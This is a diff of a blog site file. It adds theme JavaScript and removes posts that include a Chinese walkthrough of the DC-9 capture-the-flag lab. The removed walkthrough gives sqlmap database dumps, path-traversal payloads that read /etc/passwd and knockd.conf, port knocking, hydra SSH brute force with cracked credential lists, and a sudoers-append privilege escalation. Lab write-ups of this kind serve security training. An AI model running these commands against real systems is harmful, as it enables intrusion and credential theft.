-<p>该文件存储了系统用户的密码等信息，只有root权限用户才能读取</p>
-<p>Linux &#x2F;etc&#x2F;shadow（影子文件）内容解析（超详细）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tac /etc/passwd</span><br></pre></td></tr></table></figure>
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+    
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      let retryTimes = 3;
+      utils.onLoading(el);
+      function req() {
+        return new Promise((resolve, reject) => {
+          let status = 0; // 0 等待 1 完成 2 超时
+          let timer = setTimeout(() => {
+            if (status === 0) {
+              status = 2;
+              timer = null;
+              reject('请求超时');
+              if (retryTimes == 0) {
+                onFailure();
+              }
+            }
+          }, 5000);
+          fetch(url).then(function(response) {
+            if (status !== 2) {
+              clearTimeout(timer);
+              resolve(response);
+              timer = null;
+              status = 1;
+            }
+            if (response.ok) {
+              return response.json();
+            }
+            throw new Error('Network response was not ok.');
+          }).then(function(data) {
+            retryTimes = 0;
+            utils.onLoadSuccess(el);
+            callback(data);
+          }).catch(function(error) {
+            if (retryTimes > 0) {
+              retryTimes -= 1;
+              setTimeout(() => {
+                req();
+              }, 5000);
+            } else {
+              utils.onLoadFailure(el);
+              onFailure();
+            }
+          });
+        });
+      }
+      req();
+    },
+  };
+</script>
 
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MGQyYWUzYzVlOWRmNjM1NDJhZjk1YWU1N2ZlOThiY2JfNkd4ZURwaG1XZGpKblg3ZEVtVU5rbjV2dUdHcjFMRDFfVG9rZW46Qlgzc2IxTUFGb1FNbmt4YklqVmMxcE81bnNoXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>可以看到有flag4这个用户，我们有两个方法拿到这个用户的密码，一个是爆破，另一个就是提权打开shadow文件查看密码</p>
-]]></content>
-      <categories>
-        <category>靶场，DC系列</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>DC-9</title>
-    <url>/2024/04/01/DC-9/</url>
-    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip a</span><br></pre></td></tr></table></figure>
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
 
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=YWRhZmQ2NTIwMTEyMzlmMTk5NGNmNjAzNDJkMmExZDJfOGs5UDEwTUFnbmdITlVNamc3dkRHeWVjRDF3aXpDNHhfVG9rZW46VVJNM2I4WVF1b0pHVzZ4c1NFSmMxVE45bjFlXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.217.129/24</span><br></pre></td></tr></table></figure>
+<!-- required -->
+<script src="/js/main.js?v=1.27.0" async></script>
 
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=YjgxNzc2ZDY4NGRkYjcwZjk3MTcwYjc3YTQ5ZjFjZjRfZDI2YmZJSklxV1M5dURvVE12SEtzQjVJZXdUN2hHSHRfVG9rZW46V3hwMmJQdkpFb0FZZWZ4cVRzQ2M3WkIwbmxoXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.217.137</span><br></pre></td></tr></table></figure>
+<!-- optional -->
 
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NmJjODRiYTUzZDViNjI2YzA0YjQ4NjA4YmM3OTRiMzZfWHpHcERWcW1ZRWdLUkgwZGxaMlZ3cTNUYXdFdHpJWDZfVG9rZW46QU1vWmJFek1zb0s2aGF4eW1nSWNCZVV5bkRoXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p>注意到ssh服务端口是filtered的，可能是什么原因给关掉了</p>
-<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u 192.168.217.137 -e * -x 403 --random-agent</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NDY2NGViMGQxYTBiZDRjZGZlM2Q3MDlkZDZmMmIyMjVfMU56Vms5R3NmNUZIdFE4N29Ua1NxbUNXSVFSQ2k2OGZfVG9rZW46SDhvR2I5Sm1yb0xRTTR4SURORmNLMU9CbnJnXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<h2 id="页面探测"><a href="#页面探测" class="headerlink" title="页面探测"></a>页面探测</h2><p>暂时无图</p>
-<p>探测结果：</p>
-<p>发现Search页面搜索存在<a href="https://so.csdn.net/so/search?q=SQL%E6%B3%A8%E5%85%A5&spm=1001.2101.3001.7020">SQL注入</a>（原因：在上传之后网址无任何变动，判断是post请求）</p>
-<h1 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h1><h2 id="SQ注入"><a href="#SQ注入" class="headerlink" title="SQ注入"></a>SQ注入</h2><p>知道注入点，接下来上sqlmap跑，POST传参search，爆库</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;``http://192.168.217.137/results.php``&quot; --level=5 --risk=3 --batch --method=POST --data=&#x27;search=1&#x27; --current-db</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MTA0ZGEyMjgzZDM2MGRhZThjNDQ4YzY4MjU1MTAwMGFfeFMwUmQ1M0VYMFpZbWswNXdoQUMxWjA0VEQyWWVmdXBfVG9rZW46WTRUNWJjUGt5b3p2R2t4Vzd6dmNTQ0N1bjdjXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p>得到数据库后进行爆表&#x2F;数据库：Staff</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;``http://192.168.217.137/results.php``&quot; --level=5 --risk=3 --batch --method=POST --data=&#x27;search=1&#x27; -D &#x27;Staff&#x27; -tables</span><br></pre></td></tr></table></figure>
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+  });
+</script>
 
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmZlNWE3Mzc4NDJhYTlkNzkwZTUxZWRkZGI2YjQwMmJfYlRETGVaTHFLYWlDdTdGa1lLcG5tdlhjcjZ3TDhDaTJfVG9rZW46RWk3Y2JaY2Vpb2xkTHV4SFJQMmM0bWxMbnBiXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p>爆字段</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;``http://192.168.217.137/results.php``&quot; --level=5 --risk=3 --batch --method=POST --data=&#x27;search=1&#x27; -D &#x27;Staff&#x27; -T &#x27;Users&#x27; -columns</span><br></pre></td></tr></table></figure>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+</script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
+    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
+  };
+  var selector = '[data-fancybox]:not(.error)';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const els = document.getElementsByClassName('ds-memos');
+    if (els != undefined && els.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || null
+        }
+      });
+    })
+  }
+</script><script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          loop: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script><script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
 
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ODFjZDAwNDUwODc3ZGM0ZTFjNWNkZmYxYzY1OTAzZmFfT2lBb0FhVmtwRktUYklPMWZYMjlxSlVjUFVPcWdib1BfVG9rZW46T204SmJ6OGJvb1JmQWx4dlFiU2N5WWNxbnhjXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p>爆值</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;``http://192.168.217.137/results.php``&quot; --level=5 --risk=3 --batch --method=POST --data=&#x27;search=1&#x27; -D &#x27;Staff&#x27; -T &#x27;Users&#x27; -C &#x27;Username,Password,UserID&#x27; -dump</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MDMwNDA1Yzc5MTRjMzA3NTk3NDBiNzRiNGQyZjY3NWJfYmU4NkVXWFJWYk9aQVNyMDIwSExpSWE2N09sdzBna3ZfVG9rZW46TlVlMGJZRkhnb0JhcEh4a2g0RWNiWDJxbmdkXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p>只有一位用户，还有密码，这密码一看就是md5，接下来找个在线网站解密<a href="https://www.somd5.com/">https://www.somd5.com/</a></p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=Zjg2NjAyMGVjNzBiY2Q5NjVlODM1NDUwNDMzNjgyODBfZFVqQlBuTzFIdEo2amRvWXRjVmVZTGRZcllnMUZLanNfVG9rZW46TXg0V2JXWFdRb3dBN054OVVxTmNBd1ZKbk5mXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p>密码：transorbital1</p>
-<h2 id="登入后台"><a href="#登入后台" class="headerlink" title="登入后台"></a>登入后台</h2><p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDkyMTcxZWUyZTFkMjU2OGIzMDk4MmYxZTcxYjY3MDFfSW00cDBjVnNMaGZMb1N2Tnp4WjdhWGhYZFA4SVNEdWpfVG9rZW46SXc0aGJLaFNxb1RYREN4SnBsWmNEMUZEbnhmXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p>就多了个Add Record界面，注意到下面有File does not exist，想到是程序引用或读取了一个不存在的文件才会回显这个，接着用参数fuzz测试一下</p>
-<p>burpsuite抓包，构建payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?§§=../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+<!-- inject -->
 
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=Njk3MmVlMzI4ZTdiNjI4NDJjYzRjNGIwNjViYjk3OGJfblVqNkFmUHJXVFVmcjJJdVJsa2FsT0R0VXA3UXhzSHZfVG9rZW46V1V2N2JuN1VDb1F1V2N4S3lYN2NGTEVibjdiXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p>然后再把我们的参数字典加载进来</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjE3ODVhMzNmZjgzYjVkMzZmZjI5MWEyNTJjYjY5MzdfcUcxdlpKUEFoQlA4ZUxncFRLV3JIMHdqR0RseDEwSGZfVG9rZW46VTluTGJsVk5Cb1kwZ3Z4MTAwNWM5MjJVbkNkXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MjU4NTM3MTE0MTE3NDY3ZDg3YTUzMGE0M2QwYTg4ZjhfazZkQUxkNkhlM1JwUVJvS1doMHg2ZTJzZ1VkUlRoOFRfVG9rZW46TTkzMmJaSjJKb3JJZU54U3hJdGNZa2ZFbnpjXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p>参数名是file，存在任意文件读取漏洞</p>
-<h2 id="端口敲门服务"><a href="#端口敲门服务" class="headerlink" title="端口敲门服务"></a>端口敲门服务</h2><p>考虑到ssh端口是关闭的，可能是开启了knock服务（参考<a href="https://www.cnblogs.com/xiaoxiaoleo/p/8523322.html">端口敲门服务</a>），利用文件包含确认一下，一般开启了knock服务就会存在&#x2F;etc&#x2F;knockd.conf文件</p>
-<p>构造payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/addrecord.php?file=../../../../../etc/knockd.conf</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NWQ4NjUwNzg2OTdhZTEwNWVlMDY5NDhhNWNhYmUxOGFfTGhEZ0ZSZWQwZ3c4SHhqckJGb2xIYkhHYkU3ZHl0S1hfVG9rZW46Sk50VGJueWtEb0Z0R1Z4QmV4NWNzRzJJbnNmXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p>果然有，开启ssh服务得依次敲击7469,8475,9842端口，利用netcat进行敲击</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -z 192.168.217.137 7469 8475 9842</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=YTQ3NjkzMGY0NzM4MGE4YWY1NDZmZjFiYWEzZGQzYTFfUWtmYkJvQW56ZTYxNlMxdVk1QXFSeUhUZGtmOGhpZGZfVG9rZW46WktlWmJJSWI3bzhQQ1N4TW5IdmNmSFdSbnVRXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p>敲击完后发现端口打开了</p>
-<h2 id="shh爆破"><a href="#shh爆破" class="headerlink" title="shh爆破"></a>shh爆破</h2><p>无奈测试了一下admin登不上去，想起之前SQLmap跑出过一个users的数据库</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MzM5MTNmOTY0ZWRiMGNkYTYyMWEzODI1MzAzYjJlMzZfdEpHTTl1NDJnSHg2N2pOa2FHa2s5STlNdHFYZDFQcjdfVG9rZW46VGlmcmJ1emszbzM2R0x4YzZXOWNpdmFPbkVoXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p>存放网站用户信息的，我们去瞧一下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;``http://192.168.217.137/results.php``&quot; --level=5 --risk=3 --batch --method=POST --data=&#x27;search=1&#x27; -D &#x27;users&#x27; -dump</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=Mjg5N2ZmNTAwZjYxYTJkOGQ4MTNlMjI3MjAzOTE0YTNfSG5jTGxuaWhubGV2N2V5S3BnUWFWb3JQSUY1b0xwS0VfVG9rZW46QzY0b2JyaURxb3FMTGl4bkRKdGN4amdqbkxmXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p>用这些账号密码组成字典，爆破ssh</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi ``username.txt</span><br></pre></td></tr></table></figure>
-
-<p>marym</p>
-<p>julied</p>
-<p>fredf</p>
-<p>barneyr</p>
-<p>tomc</p>
-<p>jerrym</p>
-<p>wilmaf</p>
-<p>bettyr</p>
-<p>chandlerb</p>
-<p>joeyt</p>
-<p>rachelg</p>
-<p>rossg</p>
-<p>monicag</p>
-<p>phoebeb</p>
-<p>scoots</p>
-<p>janitor</p>
-<p>janitor2</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi ``password.txt</span><br></pre></td></tr></table></figure>
-
-<p>3kfs86sfd</p>
-<p>468sfdfsd2</p>
-<p>4sfd87sfd1</p>
-<p>RocksOff</p>
-<p>TC&amp;TheBoyz</p>
-<p>B8m#48sd</p>
-<p>Pebbles</p>
-<p>BamBam01</p>
-<p>UrAG0D!</p>
-<p>Passw0rd</p>
-<p>yN72#dsd</p>
-<p>ILoveRachel</p>
-<p>3248dsds7s</p>
-<p>smellycats</p>
-<p>YR3BVxxxw87</p>
-<p>Ilovepeepee</p>
-<p>Hawaii-Five-0</p>
-<p>接下来用九头蛇进行爆破</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -L username.txt -P password.txt ssh://192.168.217.137</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=Zjk0NTBmZGExY2E4MGFjZGIwZjdiOTMyMjZmYjVmNDNfb2k5WXltRFlKUFBXSFM3T1YyV1I4ZHpTNGZOVUxWY2tfVG9rZW46UWo0N2JRa1Yxb2JUQXZ4anRBYWN0b2RNbjdmXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p>爆破出了三个用户</p>
-<p>chandlerb:UrAG0D!</p>
-<p>joeyt:Passw0rd</p>
-<p>janitor:Ilovepeepee</p>
-<p>尝试登入发现janitor用户有东西</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ls -la</span><br><span class="line">cd .s*</span><br><span class="line">cat *</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MmExOGQxNTM5MGU3ODNiZjVkN2NmNWI3MDE0OGY4YWNfazRlSk5Od2kzOUVCS2w1ZjJDZmdYM1VNOGdrdW9PeUtfVG9rZW46TjR3VWJLN0Jpb1hXbG94ZlNUZWNzaEFSbmJWXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p>有几个密码，复制到刚才的password文件继续爆破ssh</p>
-<p>vi password.txt</p>
-<p>BamBam01</p>
-<p>Passw0rd</p>
-<p>smellycats</p>
-<p>P0Lic#10-4</p>
-<p>B4-Tru3-001</p>
-<p>4uGU5T-NiGHts</p>
-<p>继续爆破</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -L username.txt -P password.txt ssh://192.168.217.137</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjJmMjMxYTQ2M2U0ZTM4MjNmMTFmNTg5MzY3N2FjNjlfcUF1akZyaEc3bEJGVlg0TThMQzRad3Jtem82UmJjM2JfVG9rZW46V1l0VGJLRHh3b3BxUll4YmhsUmNiWW9NbnNlXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p>爆破出了一个新用户</p>
-<p>fredf     B4-Tru3-001</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=YjJlYzY5MWVlZDdkMGZkZmZhZTk5YjY2MTNhNjE1ZGFfVUZybjhkMkpPNkNEMTAzb1A4V0V4YkV0QXpBcXBvMHpfVG9rZW46TUJQTGJrZzI5b2hGREV4Vlkwd2NCSTN4bm1nXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjU3NTVlYjhhMTE2Y2E5ODQxNTFhMDFkYTUzNWZmODZfTEh4YVhoR0d4eTM5R3lvODNQbTlkcU9TNjlEbHljSVJfVG9rZW46RkpwbWJ0VjdRb2M5SFJ4cmk5YmNra3VsbnlmXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p>发现有个root权限文件</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /opt/devstuff/dist/test/test</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NjE0NWQ1NzU2MDNjYjAzMTlmODIwMjExMjc1MDc1OGZfcXhnMnN4clQxOG56aFBrMGFqUHpFUmlXRld0ckJMMjBfVG9rZW46SUNYVWJFMDZ1b3hlUFZ4WlBCMGNSREo3bk1nXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p>打开test文件发现是一堆乱码，应该是一个程序</p>
-<p>type name 可以查看文件类型，看是否是二进制还是文本文件</p>
-<p>结果：啥也没看出来</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjY3Y2FkZjM5ZDEzNWU3ZDc3MmQ1N2U0ZTFjYWYwMDlfVk1mZXNLSWtGZ0t3M1JiWlF0V3JlWHQ3RlNMRHNpUTlfVG9rZW46VlN1QmJaN3FMb3VuTE14VXg5MWNBUnFtblZjXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p>在上两级目录发现test.py文件还有test.spec文件，所以后面目录下的test程序应该就是根据test.py文件写的，打开文件看一下test程序是干嘛的</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NzY3NmY0YzMxNDMzYmMyMzM0MzcwMTI2ODJjODJhZjBfMnlQaTY4S010VmlKSUhmamdCSXNhQ2FPcVZhM1h0UGlfVG9rZW46S1hHU2I4VXFlb1Bza3l4V09HRmNGbmcwblA4XzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p>该脚本的意思是打开用户输入的第二个文件，将第二个文件的内容追加保存到第三个文件里面，也就是说如果有命令是test.py a.txt b.txt，就会将a.txt的文件内容保存到b.txt里面</p>
-<p>利用&#x2F;etc&#x2F;sudoers     <a href="https://blog.csdn.net/Field_Yang/article/details/51547804">sudo配置文件&#x2F;etc&#x2F;sudoers详解及实战用法-CSDN博客</a></p>
-<p>将fredf  ALL&#x3D;(ALL:ALL) ALL写成一个文件a.ttx   将这个文件追加到&#x2F;etc&#x2F;sudoers</p>
-<p>先将目录切换到有权限的&#x2F;home&#x2F;fredf</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home/fredf</span><br></pre></td></tr></table></figure>
-
-<p>然后进行文件的创建的编辑</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi a.ttx`    有人说在这里vi是个微型的，简单来说有坑，所以也可以用`nano a.ttx</span><br></pre></td></tr></table></figure>
-
-<p>写完就可进行&#x2F;home&#x2F;fredf的写入</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /opt/devstuff/dist/test/test a.ttx /etc/sudoers</span><br></pre></td></tr></table></figure>
-
-<p>不显示就说明成功了</p>
-<p>之后进行用户切换</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo su - </span><br></pre></td></tr></table></figure>
-
-<p>sudo 就是尝试实行root权限  su就是提权  - 切换到环境变量里</p>
-<p>然后输入用户fredf的密码就可以了     密码：B4-Tru3-001</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=M2NiOTg5OGY4MGQxZmRiNzQ2NjFmOGYyYWE4NDY0MmNfVjExVnd3REkzNjRMS0RhYU41RXdTRzBXM0l5cG5sOWdfVG9rZW46Vk53ZWJzVDhkbzh5OTR4WHN6emNRV001bjZlXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p>之后就是寻找flag</p>
